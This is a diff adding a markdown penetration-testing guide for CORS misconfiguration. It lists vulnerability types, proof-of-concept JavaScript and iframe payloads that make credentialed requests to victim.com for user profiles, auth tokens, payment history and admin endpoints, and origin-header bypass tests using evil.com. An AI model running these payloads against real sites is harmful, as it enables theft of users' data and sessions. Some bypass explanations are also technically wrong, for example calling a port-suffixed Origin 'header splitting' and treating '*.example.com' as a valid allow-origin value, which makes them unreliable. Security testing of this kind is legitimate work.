@@ -1,3 +1,265 @@
+ ✅ **CORS (Cross-Origin Resource Sharing) Misconfiguration – Complete Test Case (with Bypass Cases)**
+
+---
+
+# **1. List of Vulnerabilities (CORS Attack Surface)**
+
+* **1.1 `Access-Control-Allow-Origin: *` with Sensitive Data**
+  Any website can read API responses.
+
+* **1.2 Reflection of Origin Header**
+  Server reflects `Origin:` header blindly.
+
+* **1.3 `Access-Control-Allow-Credentials: true` with Wildcard**
+  Allows attacker sites to steal authenticated data.
+
+* **1.4 Weak Domain Whitelist**
+  `.example.com` allows `attacker-example.com`.
+
+* **1.5 Null Origin Trust**
+  Trusting `Origin: null` (sandboxed iframes, file://).
+
+* **1.6 Subdomain Takeover → CORS Abuse**
+  Application trusts subdomains that are hijackable.
+
+* **1.7 Misconfigured Allowed Headers**
+  Allowing attacker-controlled custom headers.
+
+* **1.8 Misconfigured Allowed Methods**
+  Exposing sensitive endpoints to `PUT`, `DELETE`, etc.
+
+* **1.9 Preflight Request Bypass**
+  Forcing browser to skip OPTIONS checks.
+
+* **1.10 JSONP + CORS Combination**
+  Leaks data even without CORS.
+
+---
+
+# **2. Sample Payloads (Core Attack Payloads)**
+
+(Simple, safe-to-read examples for testing)
+
+### **2.1 Basic Exploit JavaScript (Reads Sensitive Data)**
+
+```js
+fetch("https://victim.com/api/user", {
+  credentials: "include"
+})
+.then(r => r.text())
+.then(d => console.log(d));
+```
+
+### **2.2 Malicious Website HTML PoC**
+
+```html
+<script>
+fetch("https://victim.com/api/profile", {credentials: "include"})
+  .then(resp => resp.text())
+  .then(data => alert(data));
+</script>
+```
+
+### **2.3 Origin Reflection Test**
+
+Send request with:
+
+```
+Origin: https://evil.com
+```
+
+If response contains:
+
+```
+Access-Control-Allow-Origin: https://evil.com
+```
+
+→ Vulnerable.
+
+### **2.4 Null-Origin Test**
+
+Send:
+
+```
+Origin: null
+```
+
+If server allows:
+
+```
+Access-Control-Allow-Origin: null
+```
+
+→ Vulnerable.
+
+---
+
+# **3. Bypass Payloads (Advanced Techniques)**
+
+### **3.1 Subdomain Bypass**
+
+Server whitelist:
+
+```
+Access-Control-Allow-Origin: *.example.com
+```
+
+Attacker uses:
+
+```
+evil.example.com
+```
+
+### **3.2 Wildcard With Credentials**
+
+If server sends:
+
+```
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+```
+
+Browser blocks normally, BUT attackers use **header splitting**:
+
+```
+Origin: https://evil.com:443/
+```
+
+### **3.3 Case Manipulation**
+
+```
+Origin: HTTPS://EVIL.COM
+```
+
+Some servers match case-insensitive incorrectly.
+
+### **3.4 Null-Origin Bypass via sandboxed iframe**
+
+```html
+<iframe sandbox="allow-scripts" src="data:text/html,<script>
+fetch('https://victim.com/api',{credentials:'include'})
+.then(r=>r.text()).then(alert);
+</script>"></iframe>
+```
+
+### **3.5 Broken Regex Whitelist**
+
+Whitelist:
+
+```
+/.*example\.com$/
+```
+
+Attacker:
+
+```
+https://example.com.evil.net
+```
+
+### **3.6 JSON Content-Type Bypass**
+
+```js
+fetch("https://victim.com/secret", {
+  method: "POST",
+  headers: {"Content-Type": "text/plain"},
+  body: "test"
+})
+```
+
+### **3.7 Forbidden Header Bypass**
+
+Server incorrectly allows:
+
+```
+Access-Control-Allow-Headers: *
+```
+
+Attacker sets:
+
+```
+X-Api-Key: evil
+```
+
+---
+
+# **4. Updated With Realistic Testing Payloads (Advanced Learning)**
+
+### **4.1 Database Exposure (User Data)**
+
+```js
+fetch("https://victim.com/api/v1/users/me", {
+  credentials: "include"
+})
+.then(r => r.json())
+.then(console.log);
+```
+
+### **4.2 Payment Endpoint Access**
+
+```js
+fetch("https://victim.com/payment/history", {
+  credentials: "include"
+}).then(r => r.text()).then(console.log);
+```
+
+### **4.3 Token Leaking via CORS**
+
+```js
+fetch("https://victim.com/auth/token", {
+  credentials: "include"
+}).then(r => r.json()).then(alert);
+```
+
+### **4.4 Preflight Abuse**
+
+```js
+fetch("https://victim.com/internal/admin", {
+  method: "PUT",
+  headers: {
+    "X-Custom": "test"
+  },
+  credentials: "include"
+})
+```
+
+### **4.5 Hijacked Subdomain Exploit**
+
+```js
+fetch("https://sub.victim.com/admin/logs", {credentials:'include'})
+.then(r=>r.text())
+.then(console.log);
+```
+
+---
+
+# **5. Validation / Test Steps**
+
+**Step 1:** Send request with custom Origin
+→ check reflected `Access-Control-Allow-Origin`.
+
+**Step 2:** Test credentialed requests
+→ `credentials: include`.
+
+**Step 3:** Test allowed methods and headers
+→ `PUT`, `DELETE`, `X-Custom-Header`.
+
+**Step 4:** Try null-origin
+→ `Origin: null`.
+
+**Step 5:** Try subdomain and bypass patterns
+→ wildcard, regex, IPv6, encoded origins.
+
+---
+
+# **6. Expected Results / Impact**
+
+* Theft of **user data**, **tokens**, **sessions**.
+* Access to internal admin APIs.
+* Full account takeover through authenticated CORS misuse.
+* Payment history leakage.
+* Internal network exposure via SSRF-like effects.
+
+---
 
 # CORS vulnerability with basic origin reflection
 
